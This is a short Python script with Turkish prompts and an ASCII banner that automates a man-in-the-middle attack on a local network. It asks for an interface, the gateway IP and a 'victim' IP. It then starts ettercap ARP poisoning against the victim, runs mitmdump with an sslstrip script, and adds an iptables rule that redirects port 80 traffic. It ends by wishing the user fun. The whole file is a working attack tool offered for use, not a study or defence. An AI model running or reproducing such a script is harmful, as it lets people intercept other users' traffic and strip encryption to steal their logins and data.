import subprocess
import colorama
from colorama import Fore

colorama.init(autoreset=True)

banner = """
MM    MM IIIII TTTTTTT MM    MM                AAA           tt                               tt    iii                
MMM  MMM  III    TTT   MMM  MMM               AAAAA  uu   uu tt     oooo  mm mm mmmm    aa aa tt         oooo  nn nnn  
MM MM MM  III    TTT   MM MM MM    _____     AA   AA uu   uu tttt  oo  oo mmm  mm  mm  aa aaa tttt  iii oo  oo nnn  nn 
MM    MM  III    TTT   MM    MM              AAAAAAA uu   uu tt    oo  oo mmm  mm  mm aa  aaa tt    iii oo  oo nn   nn 
MM    MM IIIII   TTT   MM    MM              AA   AA  uuuu u  tttt  oooo  mmm  mm  mm  aaa aa  tttt iii  oooo  nn   nn                                                                                                                                                                                                                                                                              
                                                                                                       """

print(Fore.RED+banner)
print(Fore.GREEN+"\t\t\t\t\t\t\t\t\t\tCoded by Yiğit Aydemir")

arayuz = input(Fore.BLUE+"Arayuz giriniz (wlan0/eth0 vs.) :")
modem_ip = input(Fore.YELLOW+"Modem IP giriniz :")
ettercap_modem_ip = "/"+modem_ip+"//"
kurban_ip = input(Fore.RED+"Kurban cihazın IP adresini giriniz :")
ettercap_kurban_ip = "/"+kurban_ip+"//"

print(Fore.GREEN+"Man in the middle saldırısı başlatılıyor.Durumu açılan terminallerden görebilirsiniz.")

subprocess.call(["xterm", "-T", "ettercap", "-hold", "-fg", "red", "-e", "ettercap", "-Tq", "-M", "arp:remote", "-i", arayuz, "-S", ettercap_modem_ip, ettercap_kurban_ip])
subprocess.call(["xterm", "-T", "mitmdump", "-hold", "-fg", "green", "-e", "mitmdump", "-s", "sslstrip.py", "-m", "transparent"])
subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-ports", "8080"])

print(Fore.GREEN+"Man in the middle saldırısı şu anda aktif.Kapatmak için açılan terminalleri kapatın.İyi eğlenceler :)")
